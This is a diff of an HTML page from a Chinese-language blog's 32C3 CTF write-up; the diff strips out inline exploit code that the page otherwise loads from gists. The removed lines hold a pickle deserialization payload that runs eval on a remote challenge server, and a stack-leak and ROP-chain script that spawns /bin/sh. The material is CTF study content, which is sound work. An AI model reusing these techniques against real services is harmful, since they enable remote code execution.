@@ -6,13 +6,13 @@
 <meta charset="utf-8">
 <meta name="theme-color" content="#000000">
 <title>Writeup: 32c3ctf – 盘子里的部落格</title>
-<meta name="description" content="forth forth 直接能跑system1。 S" sh system gurke pickle unpickle __reduce__ eval __main__.flag.flag stderr python coding="utf8" import urllib2 class payload def comm="&quot;sys.stderr.write(__import__('__main__').flag.flag)&quot;" return data="pickle.dumps(Payload())" print urllib2.urlopen loading gist... teufel bin gadgets libc. leak rbp offset offset. offset.py>
+<meta name="description" content="forth forth 直接能跑system1。 S" sh system gurke pickle unpickle __reduce__ eval __main__.flag.flag stderr gist: cubarco teufel bin gadgets libc. leak rbp offset offset. offset.py exp.py readme flag update zctf guess sandbox references execute...>
 <meta name="keywords" content="Hack, CTF, Writeup, Exploitation, PWN, MISC">
 
 
 <!-- Twitter Cards -->
 <meta name="twitter:title" content="Writeup: 32c3ctf">
-<meta name="twitter:description" content="forth forth 直接能跑system1。 S" sh system gurke pickle unpickle __reduce__ eval __main__.flag.flag stderr python coding="utf8" import urllib2 class payload def comm="&quot;sys.stderr.write(__import__('__main__').flag.flag)&quot;" return data="pickle.dumps(Payload())" print urllib2.urlopen loading gist... teufel bin gadgets libc. leak rbp offset offset. offset.py>
+<meta name="twitter:description" content="forth forth 直接能跑system1。 S" sh system gurke pickle unpickle __reduce__ eval __main__.flag.flag stderr gist: cubarco teufel bin gadgets libc. leak rbp offset offset. offset.py exp.py readme flag update zctf guess sandbox references execute...>
 <meta name="twitter:site" content="@Cube_Lin">
 <meta name="twitter:creator" content="@Cube_Lin">
 
@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Writeup: 32c3ctf">
-<meta property="og:description" content="forth forth 直接能跑system1。 S" sh system gurke pickle unpickle __reduce__ eval __main__.flag.flag stderr python coding="utf8" import urllib2 class payload def comm="&quot;sys.stderr.write(__import__('__main__').flag.flag)&quot;" return data="pickle.dumps(Payload())" print urllib2.urlopen loading gist... teufel bin gadgets libc. leak rbp offset offset. offset.py>
+<meta property="og:description" content="forth forth 直接能跑system1。 S" sh system gurke pickle unpickle __reduce__ eval __main__.flag.flag stderr gist: cubarco teufel bin gadgets libc. leak rbp offset offset. offset.py exp.py readme flag update zctf guess sandbox references execute...>
 <meta property="og:url" content="https://cubarco.org/blog/2015/12/writeup-32c3ctf/">
 <meta property="og:site_name" content="盘子里的部落格">
 
@@ -193,22 +193,7 @@
 
 <p>pickle 在 unpickle 的时候会执行对象的 <code class="highlighter-rouge">__reduce__</code> 方法<sup id="fnref:2"><a href="#fn:2" class="footnote">2</a></sup>。用 eval 把 <code class="highlighter-rouge">__main__.flag.flag</code> 打进 stderr 就行了。</p>
 
-<noscript><pre>#!/usr/bin/env python
-# coding=utf8
-
-import urllib2
-import pickle
-
-
-class Payload(object):
-    def __reduce__(self):
-        comm = "sys.stderr.write(__import__('__main__').flag.flag)"
-        return (eval, (comm, ))
-
-data = pickle.dumps(Payload())
-print data
-print urllib2.urlopen('http://136.243.194.43/', data=data).read()</pre></noscript>
-<div class="gist" data-gist="cubarco/e46eb03e1cd06046d130">Loading gist...</div>
+<div class="gist" data-gist="cubarco/e46eb03e1cd06046d130">Gist: cubarco/e46eb03e1cd06046d130</div>
 
 <h2 id="teufel">teufel</h2>
 
@@ -218,105 +203,11 @@ print urllib2.urlopen('http://136.243.194.43/', data=data).read()</pre></noscrip
 
 <h6 id="offsetpy">offset.py</h6>
 
-<noscript><pre>#!/usr/bin/env python
-# coding=utf8
-
-from pwn import p64, remote
-from time import sleep
-from struct import unpack
-
-main_without_push_addr = 0x4004ee
-
-
-def shift_offsets():
-    for i in range(0, 20):
-        yield i * 0x1000
-        if i != 0:
-            yield i * -0x1000
-
-for shift in shift_offsets():
-    p = remote('136.243.194.41', 666)
-    # leak stack address
-    p.send(p64(9))
-    sleep(0.1)
-    p.send('a'*9)
-
-    rbp_base_str = '\x00' + p.recvuntil('\x7f')[-5:] + '\x00'*2
-    rbp_base = unpack('Q', rbp_base_str)[0]
-
-    rbp_new_base = rbp_base - 0x500
-    __stack_chk_fail_addr = rbp_base - 0x4d41e0 + shift
-
-    print '[*] rbp_base: ' + hex(rbp_base)
-
-    # set rbp and rsp
-    payload1 = 'a' * 8
-    payload1 += p64(rbp_new_base) + p64(main_without_push_addr)
-
-    p.send(p64(len(payload1)))
-    sleep(0.1)
-    p.send(payload1)
-
-    ropchain = 'a' * 16
-    ropchain += p64(__stack_chk_fail_addr)
-
-    p.send(p64(len(ropchain)))
-    sleep(0.1)
-    p.send(ropchain)
-
-    ret = p.recvall()
-    if ret.find('stack smash') &gt; -1:
-        print '[*] __stack_chk_fail offset: ' + hex(-0x4d41e0 + shift)
-        break
-    p.close()</pre></noscript>
-<div class="gist" data-gist="cubarco/569fd814a29d8ef988e1" data-gist-file="32c3ctf-teufel-offset.py">Loading gist...</div>
+<div class="gist" data-gist="cubarco/569fd814a29d8ef988e1" data-gist-file="32c3ctf-teufel-offset.py">Gist: cubarco/569fd814a29d8ef988e1</div>
 
 <h6 id="exppy">exp.py</h6>
 
-<noscript><pre>#!/usr/bin/env python
-# coding=utf8
-
-from pwn import p64, remote
-from time import sleep
-from struct import unpack
-
-main_without_push_addr = 0x4004ee
-
-p = remote('136.243.194.41', 666)
-
-# leak stack address
-p.send(p64(9))
-sleep(0.1)
-p.send('a'*9)
-rbp_base_str = '\x00' + p.recvuntil('\x7f')[-5:] + '\x00'*2
-rbp_base = unpack('Q', rbp_base_str)[0]
-
-rbp_new_base = rbp_base - 0x500
-__stack_chk_fail_addr = rbp_base - 0x4d11e0
-system_addr = __stack_chk_fail_addr - 0xd4a50
-pop_rdi_ret = __stack_chk_fail_addr - 0xf757e
-
-print '[*] rbp_base: ' + hex(rbp_base)
-
-# set rbp and rsp
-payload1 = 'a' * 8
-payload1 += p64(rbp_new_base) + p64(main_without_push_addr)
-
-p.send(p64(len(payload1)))
-sleep(0.1)
-p.send(payload1)
-
-ropchain = 'a' * 8
-ropchain += '/bin/sh\x00'
-ropchain += p64(pop_rdi_ret) + p64(rbp_new_base)
-ropchain += p64(system_addr)
-
-p.send(p64(len(ropchain)))
-sleep(0.1)
-p.send(ropchain)
-
-p.interactive()</pre></noscript>
-<div class="gist" data-gist="cubarco/569fd814a29d8ef988e1" data-gist-file="32c3ctf-teufel-exp.py">Loading gist...</div>
+<div class="gist" data-gist="cubarco/569fd814a29d8ef988e1" data-gist-file="32c3ctf-teufel-exp.py">Gist: cubarco/569fd814a29d8ef988e1</div>
 
 <h2 id="deldel"><del>吐槽</del></h2>
 
